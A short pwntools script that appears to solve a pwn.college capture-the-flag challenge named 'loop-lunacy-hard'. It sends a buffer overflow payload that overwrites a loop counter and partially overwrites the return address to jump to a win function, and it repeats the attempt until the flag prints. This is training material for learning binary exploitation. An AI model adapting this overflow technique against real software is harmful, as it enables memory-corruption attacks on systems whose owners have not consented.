from pwn import *

context.arch = "amd64"
context.log_level = "info"

overwrite_n = p8(64 + 8 - 1)

win_offset = p16(0x1481)

padding = b"A" * 48

payload = padding + overwrite_n + win_offset

while True:
    p = process("/challenge/loop-lunacy-hard")
    p.sendline(b"74")
    p.sendline(payload)
    a = p.recvall(timeout=1)
    if b"pwn.college{" in a:
        print(a.decode(errors="ignore"))
        p.close()
        break
